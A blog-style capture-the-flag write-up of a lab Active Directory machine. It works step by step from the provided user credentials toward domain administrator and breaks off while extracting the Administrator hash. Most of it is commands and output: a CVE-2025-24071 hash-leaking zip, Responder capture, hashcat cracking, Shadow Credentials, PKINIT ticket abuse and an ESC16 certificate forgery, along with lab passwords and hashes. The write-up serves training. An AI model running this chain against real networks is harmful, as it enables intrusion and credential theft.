---
title: Boot2Root - Machine 0x49637
published: 2025-07-28
description: This post covers my process of exploiting Machine 0x49637 — a realistic lab that simulates an Active Directory environment with various typical privilege escalation techniques.
tags: [redteam, windows, real-life, pentest]
category: Boot2Root
draft: false
---

# Machine 0x49637

> Description: As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: **j.fleischman / J0elTHEM4n1990!**
> 

# Recon:

## Rustscan + Nmap

```bash
┌──(I3isk3t㉿kali)-[~/Documents/htb]
└─$ rustscan -a 10.10.11.69 -- -A

PORT      STATE SERVICE               REASON          VERSION
53/tcp    open  domain                syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec          syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-07-15 09:11:03Z)
139/tcp   open  netbios-ssn           syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap                  syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-15T09:12:45+00:00; +6h36m48s from scanner time.
445/tcp   open  microsoft-ds?         syn-ack ttl 127
464/tcp   open  kpasswd5?             syn-ack ttl 127
593/tcp   open  ncacn_http            syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldapssl?          syn-ack ttl 127
|_ssl-date: 2025-07-15T09:12:44+00:00; +6h36m47s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
....
3268/tcp  open  ldap                  syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-15T09:12:45+00:00; +6h36m48s from scanner time.
3269/tcp  open  ssl/globalcatLDAPssl? syn-ack ttl 127
|_ssl-date: 2025-07-15T09:12:44+00:00; +6h36m47s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
....
5985/tcp  open  http                  syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf                syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc                 syn-ack ttl 127 Microsoft Windows RPC
49689/tcp open  ncacn_http            syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc                 syn-ack ttl 127 Microsoft Windows RPC
49691/tcp open  msrpc                 syn-ack ttl 127 Microsoft Windows RPC
49707/tcp open  msrpc                 syn-ack ttl 127 Microsoft Windows RPC
49713/tcp open  msrpc                 syn-ack ttl 127 Microsoft Windows RPC
49742/tcp open  msrpc                 syn-ack ttl 127 Microsoft Windows RPC

OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)

```

- DC01.fluffy.htb
- fluffy.htb
- fluffy-DC01-CA

## SMB enum

This machine gave me a user account: `j.fleischman / J0elTHEM4n1990!` login to SMB Server to see if there is anything helpful.

```bash
┌──(I3isk3t㉿kali)-[~/Documents/htb]
└─$ smbclient //10.10.11.69/IT -U j.fleischman --password=J0elTHEM4n1990!
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jul 15 05:01:54 2025
  ..                                  D        0  Tue Jul 15 05:01:54 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025

                5842943 blocks of size 4096. 2247486 blocks available
smb: \> get Upgrade_Notice.pdf

```

I saw `Upgrade_Notice.pdf` , this might helpful. I can use `get` to download it and here is it:

> Upgrade_Notice.pdf:
> 

![Upgrade_Notice_page-0001](https://github.com/user-attachments/assets/7647d109-cf6f-4cf4-9aa5-747e3422a6b9)  

<img width="2000" height="1774" alt="56a383e3-2fca-4bd7-aabe-4a06331372c0" src="https://github.com/user-attachments/assets/11d1c328-3196-460d-9e99-dce12ed072a4" />

- The content reveals that several critical vulnerabilities have been disclosed, and the administrators are required to patch all affected systems. After research, I began focusing on **CVE-2025-24071**, which affects Windows systems that handle `.library-ms` files.
- This vulnerability allows crafted `.library-ms` files to trigger unintended behavior when opened, potentially causing the system to initiate SMB connections - which can be abused to capture **NTLMv2 hashes** over the network.
- The document `Upgrade_Notice.pdf` mentioned that administrators must review affected systems and apply updates during a scheduled maintenance window. Since the `IT` share was likely used for sharing upgrade-related files. Based on that, I can put the `exploit.zip` file there, waiting it to be opened during the update process.

# User flag:  

## CVE-2025-24071  

I got the public **POC** for this **CVE** on github.  

This created a malicious file named `exploit.zip`, containing a specially crafted `.library-ms` file that, when opened by a victim I can capture user’s **NTLMv2 hashes**:

```bash
┌──(I3isk3t㉿kali)-[~/Documents/htb]
└─$ python3 CVE-2025-24071.py -i 10.10.14.4 -f pain

Creating exploit with filename: test.library-ms
Target IP: 10.10.11.69

Generating library file...
✓ Library file created successfully

Creating ZIP archive...
✓ ZIP file created successfully

Cleaning up temporary files...
✓ Cleanup completed

Process completed successfully!
Output file: exploit.zip
Run this file on the victim machine and you will see the effects of the vulnerability such as using ftp smb to send files etc.
```

Upload this ZIP archive to the `IT` SMB share:

```bash
┌──(I3isk3t㉿kali)-[~/Documents/htb]
└─$ smbclient //10.10.11.69/IT -U j.fleischman%J0elTHEM4n1990! -c "put exploit.zip"
putting file exploit.zip as \exploit.zip (1.1 kb/s) (average 1.1 kb/s)
```

The file was uploaded, I started `Responder` to listen for any outbound SMB authentication attempts:

```bash
┌──(I3isk3t㉿kali)-[~/Documents/htb]
└─$ sudo responder -I tun0 -v  
....
[+] Current Session Variables:
    Responder Machine Name     [WIN-PHP5IK44ER2]
    Responder Domain Name      [IN6G.LOCAL]
    Responder DCE-RPC Port     [48282]

[+] Listening for events...                                                                           

[SMB] NTLMv2-SSP Client   : 10.10.11.69
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:75a8a4ddbb75c75e:76E4D4420EDA5E696779656A01E4F630:0101000000000000808D07E613F5DB010E2032B15E162CA3000000000200080049004E003600470001001E00570049004E002D00500048005000350049004B003400340045005200320004003400570049004E002D00500048005000350049004B00340034004500520032002E0049004E00360047002E004C004F00430041004C000300140049004E00360047002E004C004F00430041004C000500140049004E00360047002E004C004F00430041004C0007000800808D07E613F5DB0106000400020000000800300030000000000000000100000000200000E5A06669645CAC4414A0C6E41F357FF87C96E96AB82DCD511038CD9FA0E48F6D0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0034000000000000000000 
```

Then I cracked this hash using `hashcat` and wordlist `rockyou.txt` :

```bash
┌──(I3isk3t㉿kali)-[~/Documents/htb/fluffy]
└─$ hashcat -m 5600 -a 0 agila_hash.txt /usr/share/wordlists/rockyou.txt --force 
hashcat (v6.2.6) starting
....
P.AGILA::FLUFFY:b73f8dcf3cdb3f82:01f3be65433258be94b58e0dc24c2d8f:0101000000000000808d07e613f5db014dc6a3ffbd0fc1ae000000000200080049004e003600470001001e00570049004e002d00500048005000350049004b003400340045005200320004003400570049004e002d00500048005000350049004b00340034004500520032002e0049004e00360047002e004c004f00430041004c000300140049004e00360047002e004c004f00430041004c000500140049004e00360047002e004c004f00430041004c0007000800808d07e613f5db0106000400020000000800300030000000000000000100000000200000e5a06669645cac4414a0c6e41f357ff87c96e96ab82dcd511038cd9fa0e48f6d0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0034000000000000000000:prometheusx-303
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: P.AGILA::FLUFFY:b73f8dcf3cdb3f82:01f3be65433258be94...000000
Time.Started.....: Mon Jul 14 23:23:12 2025, (5 secs)
Time.Estimated...: Mon Jul 14 23:23:17 2025, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1083.4 kH/s (0.73ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4517888/14344385 (31.50%)
Rejected.........: 0/4517888 (0.00%)
Restore.Point....: 4515840/14344385 (31.48%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: proretriever -> progree
Hardware.Mon.#1..: Util: 53%
```

## Bloodhound  

```bash
┌──(I3isk3t㉿kali)-[~/Documents/htb/fluffy]
└─$ bloodhound-python -d FLUFFY.HTB -u j.fleischman -p 'J0elTHEM4n1990!' -gc dc01.fluffy.htb -c all -ns 10.10.11.69

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: fluffy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.fluffy.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 10 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.fluffy.htb
INFO: Done in 00M 16S
                                                                                                               
┌──(I3isk3t㉿kali)-[~/Documents/htb/fluffy]
└─$ ls
20250714233255_computers.json   20250714233255_gpos.json    20250714233255_users.json
20250714233255_containers.json  20250714233255_groups.json  20250714233255_domains.json
20250714233255_ous.json     
```

From BloodHound, I discovered that the `SERVICE ACCOUNT MANAGERS` group has **GenericAll** rights over the `SERVICE ACCOUNTS` group. Additionally, the `SERVICE ACCOUNTS` group has **GenericWrite** rights over three service accounts: `ca_svc`, `ldap_svc`, and `winrm_svc`.

Since `p.agila` is a member of `SERVICE ACCOUNT MANAGERS`, I was able to add this user into the **`SERVICE ACCOUNTS`** group, effectively granting `p.agila` **write access** over those three service accounts.

```bash
Finding:
		p.agila is part of SERVICE ACCOUNT MANAGERS.

Access Path:
		SERVICE ACCOUNT MANAGERS → **GenericAll** on SERVICE ACCOUNTS
		SERVICE ACCOUNTS → **GenericWrite** on ca_svc, ldap_svc, winrm_svc

Attack Strategy:
		Add p.agila to SERVICE ACCOUNTS (via GenericAll)
		Perform Shadow Credentials attack on any of the 3 service accounts
```

 Add **p.agila** to **SERVICE ACCOUNTS:**

```bash
┌──(I3isk3t㉿kali)-[~/usr-tools/hacking_active_directory/PKINITtools]
└─$ net rpc group addmem "SERVICE ACCOUNTS" "p.agila" -U "FLUFFY.HTB"/"p.agila"%"prometheusx-303" -S "DC01.FLUFFY.HTB"
```

Check if `p.agila` was successfully added to the `Service Accounts` group:

```bash
┌──(I3isk3t㉿kali)-[~/Documents/htb/fluffy]
└─$ net rpc group members "Service Accounts" -U "fluffy.htb"/"p.agila"%"prometheusx-303" -S "10.10.11.69"
FLUFFY\ca_svc
FLUFFY\ldap_svc
FLUFFY\p.agila
FLUFFY\winrm_svc
```

Check if `p.agila` had **GenericWrite** rights:

```bash
┌──(I3isk3t㉿kali)-[~/Documents/htb/fluffy]
└─$ bloodyAD -d fluffy.htb -u p.agila -p 'prometheusx-303' --dc-ip 10.10.11.69 get writable --detail

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=fluffy,DC=htb
url: WRITE
wWWHomePage: WRITE
 
distinguishedName: CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
shadowFlag: WRITE
shadowExpire: WRITE
....
msDS-SourceAnchor: WRITE
msDS-KeyCredentialLink: WRITE
msDS-ExternalDirectoryObjectId: WRITE
msDS-AssignedAuthNPolicy: WRITE
```

## Get the user flag  

I tried to dig into **ADCS vulnerabilities** at first but it failed:

```bash
┌──(I3isk3t㉿kali)-[~/Documents/htb]
└─$ certipy find -vulnerable -u 'p.agila' -p 'prometheusx-303' -dc-ip 10.10.11.69 -stdout 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'fluffy-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'fluffy-DC01-CA' via CSRA: Could not connect: timed out
[*] Trying to get CA configuration for 'fluffy-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'fluffy-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
Certificate Templates                   : [!] Could not find any certificate templates
```

After a while researching, trying, testing, doing stuff, I found it. This is my idea:

- I can use the `gettgtpkinit` module to generate a **TGT** based on a forged certificate. Then, with `getnthash`, I could extract the **NT hash** from that ticket. Among the available targets, `winrm_svc` stood out because it had remote login rights. I had its hash and I could authenticate directly using `Evil-WinRM` and gain access to the system.

**Let’s start hacking:**

I used `pywhisker` to perform a **Shadow Credentials attack** by adding a forged certificate to the `winrm_svc` account. This updated the `msDS-KeyCredentialLink` attribute, allowing me to later request a **TGT** via PKINIT authentication using the generated `.pfx` certificate.

```bash
┌──(I3isk3t㉿kali)-[~/usr-tools/hacking_active_directory/pywhisker/pywhisker]
└─$ python3 pywhisker.py -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "winrm_svc" --action "add"
[*] Searching for the target account
[*] Target user found: CN=winrm service,CN=Users,DC=fluffy,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 235dbfbc-6188-6101-f933-dffc6c0e5212
[*] Updating the msDS-KeyCredentialLink attribute of winrm_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: 9jNHvdy0.pfx
[+] PFX exportiert nach: 9jNHvdy0.pfx
[i] Passwort für PFX: 7oAPCQkmL9HEaSMoVJIP
[+] Saved PFX (#PKCS12) certificate & key at path: 9jNHvdy0.pfx
[*] Must be used with password: 7oAPCQkmL9HEaSMoVJIP
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
                                                                                                                    
┌──(I3isk3t㉿kali)-[~/usr-tools/hacking_active_directory/pywhisker/pywhisker]
└─$ ls
9jNHvdy0_cert.pem  9jNHvdy0_priv.pem  pywhisker.py       WthrPS9O.pfx
9jNHvdy0.pfx       __init__.py        WthrPS9O_cert.pem  WthrPS9O_priv.pem

```

After that, use `gettgtpkinit.py` to request a **TGT** for **`winrm_svc`** using the forged PFX certificate created in the previous step. The TGT was successfully generated and saved as a `.ccache` file for later use.

```bash
┌──(I3isk3t㉿kali)-[~/usr-tools/hacking_active_directory/PKINITtools]
└─$ python3 gettgtpkinit.py fluffy.htb/winrm_svc -cert-pfx /home/I3isk3t/usr-tools/hacking_active_directory/pywhisker/pywhisker/9jNHvdy0.pfx -pfx-pass 7oAPCQkmL9HEaSMoVJIP winrm_svc.ccache
2025-07-28 10:01:45,487 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-07-28 10:01:45,518 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-07-28 10:02:03,844 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-07-28 10:02:03,844 minikerberos INFO     4708d31d04ab5041d6c7b94b7b94c549ef95b828ff09b091f138debc8d32c739
INFO:minikerberos:4708d31d04ab5041d6c7b94b7b94c549ef95b828ff09b091f138debc8d32c739
2025-07-28 10:02:03,847 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

Finally, export the **TGT** from the `.ccache` file and used `getnthash.py` with the AS-REP key to recover the **NT hash** of **`winrm_svc`**. This hash can be used for pass-the-hash authentication.

```bash
┌──(I3isk3t㉿kali)-[~/usr-tools/hacking_active_directory/PKINITtools]
└─$ export KRB5CCNAME=winrm_svc.ccache

┌──(I3isk3t㉿kali)-[~/usr-tools/hacking_active_directory/PKINITtools]
└─$ python3 getnthash.py -key 4708d31d04ab5041d6c7b94b7b94c549ef95b828ff09b091f138debc8d32c739 fluffy.htb/winrm_svc
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
33bd09dcd697600edf6b3a7af4875767
```

Nah, this is the last step, access and get the user flag:

```bash
┌──(I3isk3t㉿kali)-[~/usr-tools/hacking_active_directory/PKINITtools]
└─$ evil-winrm -i 10.10.11.69 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767                                
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> dir 

    Directory: C:\Users\winrm_svc\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/28/2025   6:48 AM             34 user.txt

*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> cat user.txt
29299f2c01bbdeae2943d954a137d712
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> 
```

# Root flag:

After a while researching for the previous **CVEs** in the documents, I found nothing.
Look at the list `Service Accounts` :

```bash
┌──(I3isk3t㉿kali)-[~/usr-tools/hacking_active_directory/PKINITtools]
└─$ net rpc group members "Service Accounts" -U "fluffy.htb"/"p.agila"%"prometheusx-303" -S "10.10.11.69"
FLUFFY\ca_svc
FLUFFY\ldap_svc
FLUFFY\p.agila
FLUFFY\winrm_svc
```

I will try to check if there are some vulnerabilites in the certificate authorities, maybe it has some **ADCS vulnerabilities** there.

## Finding ADCS vulnerabilites

Add forged certificate to `ca_svc` for certificate-based authentication:

```bash
┌──(I3isk3t㉿kali)-[~/usr-tools/hacking_active_directory/pywhisker/pywhisker]
└─$ python3 pywhisker.py -d fluffy.htb -u winrm_svc -H :33bd09dcd697600edf6b3a7af4875767 -t ca_svc -a add --dc-ip 10.10.11.69
[*] Searching for the target account
[*] Target user found: CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 1a83287f-68ae-ba62-57d7-a483539af4d0
[*] Updating the msDS-KeyCredentialLink attribute of ca_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: kdYkWIUe.pfx
[+] PFX exportiert nach: kdYkWIUe.pfx
[i] Passwort für PFX: gbHrq4B8tHNBqcqTclyk
[+] Saved PFX (#PKCS12) certificate & key at path: kdYkWIUe.pfx
[*] Must be used with password: gbHrq4B8tHNBqcqTclyk
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

Obtain a **TGT** for `ca_svc` to authenticate via Kerberos:

```bash
┌──(I3isk3t㉿kali)-[~/usr-tools/hacking_active_directory/PKINITtools]
└─$ python3 gettgtpkinit.py fluffy.htb/ca_svc -cert-pfx /home/I3isk3t/usr-tools/hacking_active_directory/pywhisker/pywhisker/kdYkWIUe.pfx -pfx-pass gbHrq4B8tHNBqcqTclyk ca_svc.ccache
2025-07-28 10:58:02,133 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-07-28 10:58:02,165 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
Traceback (most recent call last):
  File "/home/I3isk3t/usr-tools/hacking_active_directory/PKINITtools/gettgtpkinit.py", line 349, in <module>
    main()
    ~~~~^^
  File "/home/I3isk3t/usr-tools/hacking_active_directory/PKINITtools/gettgtpkinit.py", line 345, in main
    amain(args)
    ~~~~~^^^^^^
  File "/home/I3isk3t/usr-tools/hacking_active_directory/PKINITtools/gettgtpkinit.py", line 315, in amain
    res = sock.sendrecv(req)
  File "/usr/lib/python3/dist-packages/minikerberos/network/clientsocket.py", line 85, in sendrecv
    raise KerberosError(krb_message)
minikerberos.protocol.errors.KerberosError:  Error Name: KRB_AP_ERR_SKEW Detail: "The clock skew is too great" 
```

**KRB_AP_ERR_SKEW** means the attacker's and DC's clocks differ too much, causing Kerberos to reject the TGT request. So i use `ntpdate`:  

```bash
┌──(I3isk3t㉿kali)-[~/usr-tools/hacking_active_directory/PKINITtools]
└─$ sudo ntpdate 10.10.11.69
[sudo] password for I3isk3t: 
2025-07-28 11:08:49.218694 (-0400) +603.715564 +/- 0.023628 10.10.11.69 s1 no-leap
CLOCK: time stepped by 603.715564
                                                                                                                    
┌──(I3isk3t㉿kali)-[~/usr-tools/hacking_active_directory/PKINITtools]
└─$ python3 gettgtpkinit.py fluffy.htb/ca_svc -cert-pfx /home/I3isk3t/usr-tools/hacking_active_directory/pywhisker/pywhisker/kdYkWIUe.pfx -pfx-pass gbHrq4B8tHNBqcqTclyk ca_svc.ccache
2025-07-28 11:08:53,213 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-07-28 11:08:53,243 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-07-28 11:08:57,539 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-07-28 11:08:57,539 minikerberos INFO     9d4fc7befff9700cfd154d88b90c392771ec519a5ddcd8fdcc7969eb8d438bce
INFO:minikerberos:9d4fc7befff9700cfd154d88b90c392771ec519a5ddcd8fdcc7969eb8d438bce
2025-07-28 11:08:57,543 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

Extract **NT hash** of `ca_svc` from **TGT** using the private key:  

```bash
┌──(I3isk3t㉿kali)-[~/usr-tools/hacking_active_directory/PKINITtools]
└─$ export KRB5CCNAME=ca_svc.ccache                            
                                                                                                                    
┌──(I3isk3t㉿kali)-[~/usr-tools/hacking_active_directory/PKINITtools]
└─$ python3 getnthash.py -key 9d4fc7befff9700cfd154d88b90c392771ec519a5ddcd8fdcc7969eb8d438bce fluffy.htb/ca_svc
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
ca0f4f9e9eb8a092addf53bb03fc98c8
```

Looking for **ADCS vulnerabilites**:

```bash
┌──(I3isk3t㉿kali)-[~/Documents/htb]
└─$ certipy find -vulnerable -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -stdout   
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates

```

There is `ESC16 : Security Extension is disabled.` . Lets take a small research on this vul.

```
With ESC16:
ca_svc user can enroll certificates and the CA doesn't enforce EKU, they can:
	- Request a certificate impersonating a high-privileged user (e.g., Administrator)
	- Use the forged certificate to get a TGT via PKINIT
	- Authenticate as that privileged user and escalate privileges
```

## Get the root flag

I tried following the methods in [the document above](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation) for privilege escalation, but it didn’t work. 
Then I tried another way:

- The `ca_svc` account is a service account for **ADCS** with special certificate permissions.
- I can perform privilege escalation and certificate manipulation.

> **Fake UPN → Forge cert → Get TGT as Administrator → Administrator access.**
> 

**1. Fake UPN**

Use certipy to update the `ca_svc` account’s userPrincipalName to `administrator` for privilege escalation:

```bash
┌──(I3isk3t㉿kali)-[~/Documents/htb]
└─$ certipy account -u winrm_svc -hashes :33bd09dcd697600edf6b3a7af4875767 -dc-ip 10.10.11.69 -upn 'administrator' -user 'ca_svc' update
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```

**2. Forge cert**

Forge a certificate for the `administrator` account by abusing the ESC16 vulnerability and the compromised `ca_svc` account:

```bash
┌──(I3isk3t㉿kali)-[~/usr-tools/hacking_active_directory/PKINITtools]
└─$ certipy req -k -dc-ip '10.10.11.69' -target 'dc01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User' 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 18
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

```

**3. Get TGT as Administrator**

Use forged certificate to obtain a **TGT** for the administrator via PKINIT, saving it as a `.ccache` for Kerberos authentication:

```bash
┌──(I3isk3t㉿kali)-[~/usr-tools/hacking_active_directory/PKINITtools]
└─$ python3 gettgtpkinit.py -cert-pfx administrator.pfx -pfx-pass '' fluffy.htb/administrator administrator.ccache
2025-07-28 11:47:27,783 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-07-28 11:47:27,879 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-07-28 11:47:32,058 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-07-28 11:47:32,058 minikerberos INFO     6ad40cd6e09a223264c7fb81cb199f5811fc18aec04410dcd6532fa420c63c3a
INFO:minikerberos:6ad40cd6e09a223264c7fb81cb199f5811fc18aec04410dcd6532fa420c63c3a
2025-07-28 11:47:32,061 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

**4. Administrator access**

Extract **NT hash** of the administrator account using the forged **TGT** and **AS-REP key**:

```bash
┌──(I3isk3t㉿kali)-[~/usr-tools/hacking_active_directory/PKINITtools]
└─$ export KRB5CCNAME=administrator.ccache
                                                                                                                                     
┌──(I3isk3t㉿kali)-[~/usr-tools/hacking_active_directory/PKINITtools]
└─$ python3 getnthash.py -key 6ad40cd6e09a223264c7fb81cb199f5811fc18aec04410dcd6532fa420c63c3a fluffy.htb/administrator
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
